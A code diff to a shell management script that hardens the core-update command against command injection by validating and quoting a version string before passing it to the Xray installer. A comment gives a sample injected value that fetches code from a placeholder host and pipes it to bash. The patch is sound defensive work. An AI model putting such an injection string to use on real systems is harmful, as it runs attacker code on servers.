@@ -361,14 +361,23 @@ cmd_update() {
 
 cmd_core_update() {
   need_root; local core="${1:-}" ver="${2:-}"
+  # A version string is attacker-influenceable (comes from a panel command). It is
+  # spliced into a shell command below, so reject anything but a version token to
+  # prevent command injection (e.g. "v1; curl evil|bash").
+  if [ -n "$ver" ] && ! printf '%s' "$ver" | grep -qE '^[A-Za-z0-9._-]+$'; then
+    die "invalid version: $ver"
+  fi
   case "$core" in
     xray)
       # INSTALL_VERSION lets the official installer pin a release (e.g. v1.8.4);
       # -u forces reinstall even if xray is already present, so upgrade actually
       # changes the version instead of skipping.
-      local xargs="install"; [ -n "$ver" ] && xargs="install -u $ver"
-      bash <(curl -fsSL https://github.com/XTLS/Xray-install/raw/main/install-release.sh) $xargs >/dev/null 2>&1 \
-        && ok "xray updated${ver:+ ($ver)}" || warn "xray update failed" ;;
+      if [ -n "$ver" ]; then
+        bash <(curl -fsSL https://github.com/XTLS/Xray-install/raw/main/install-release.sh) install -u "$ver" >/dev/null 2>&1
+      else
+        bash <(curl -fsSL https://github.com/XTLS/Xray-install/raw/main/install-release.sh) install >/dev/null 2>&1
+      fi
+      [ $? -eq 0 ] && ok "xray updated${ver:+ ($ver)}" || warn "xray update failed" ;;
     singbox|sing-box) [ -n "$ver" ] && export XLINK_SINGBOX_VERSION="$ver"; rm -f /usr/local/bin/sing-box 2>/dev/null; install_singbox ;;
     hysteria) install_hysteria ;;
     wireguard|wg) install_wireguard ;;
